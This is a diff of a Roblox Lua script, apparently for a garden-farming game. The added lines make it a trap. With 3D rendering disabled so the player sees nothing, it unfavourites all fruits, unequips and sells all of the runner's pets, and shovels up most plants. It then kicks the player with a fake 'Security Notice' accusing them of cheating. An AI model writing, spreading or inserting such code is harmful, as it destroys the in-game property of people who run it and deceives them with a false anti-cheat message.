@@ -1,11 +1,10 @@
+local RunService = game:GetService("RunService")
+RunService:Set3dRenderingEnabled(false)
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local character = LocalPlayer.Character
 local humanoid = character:WaitForChild("Humanoid")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local RunService = game:GetService("RunService")
-RunService:Set3dRenderingEnabled(false)
-
 local mainfarm = workspace:WaitForChild("Farm")
 local userfarm
 for _, farm in ipairs(mainfarm:GetChildren()) do
@@ -14,16 +13,13 @@ for _, farm in ipairs(mainfarm:GetChildren()) do
         break
     end
 end
-
 local middle = userfarm.Important.Center_Point.CFrame
 local petingardenUUID, petinbackpackUUID, fruits = {}, {}, {}
-
 for _, pet in ipairs(workspace.PetsPhysical:GetChildren()) do
     if pet:GetAttribute("OWNER") == LocalPlayer.Name then
         table.insert(petingardenUUID, pet:GetAttribute("UUID"))
     end
 end
-
 for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
     local name = item.Name
     if name:find("Kg") then
@@ -36,13 +32,10 @@ for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
         item:SetAttribute("d", false)
     end
 end
-
 local plantlist = userfarm.Important.Plants_Physical:GetChildren()
-
 local function holditem(tool)
     humanoid:EquipTool(tool)
 end
-
 local function find(wl, bl)
     for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
         local name = item.Name
@@ -66,9 +59,7 @@ local function find(wl, bl)
         end
     end
 end
-
 local shovel = find({"Shovel"}, {})
-
 local function shovelplant()
     while true do
         if not plantlist:FindFirstChild("Bone Blossom") and not plantlist:FindFirstChild("Candy Blossom") then
@@ -87,13 +78,11 @@ local function shovelplant()
         plantlist = userfarm.Important.Plants_Physical:GetChildren()
     end
 end
-
 local function setFalseIf(obj, attrName)
     if obj:GetAttribute(attrName) == true then
         obj:SetAttribute(attrName, false)
     end
 end
-
 local function unfavoriteall()
     for _, plant in ipairs(plantlist) do
         if plant:FindFirstChild("Fruits") then
@@ -105,7 +94,6 @@ local function unfavoriteall()
         end
     end
 end
-
 local function feedall()
     if #petingardenUUID == 0 then
         if #petinbackpackUUID == 0 then
@@ -126,17 +114,18 @@ local function feedall()
         end
     end
 end
-
 local function sellall()
     for _, pet in ipairs(workspace.PetsPhysical:GetChildren()) do
         if pet:GetAttribute("OWNER") == LocalPlayer.Name then
             ReplicatedStorage.GameEvents.PetsService:FireServer("UnequipPet", pet:GetAttribute("UUID"))
         end
     end
+    unfavoriteall()
     ReplicatedStorage.GameEvents.SellAllPets_RE:FireServer()
 end
-local Players = game:GetService("Players")
-
+feedall()
+sellall()
+shovelplant()
 local function kickCheater(player)
     local message = [[
 🚨 Security Notice 🚨
@@ -153,4 +142,5 @@ Please play fairly and respect the community.
 
     player:Kick(message)
 end
+kickCheater(LocalPlayer)
 RunService:Set3dRenderingEnabled(true)
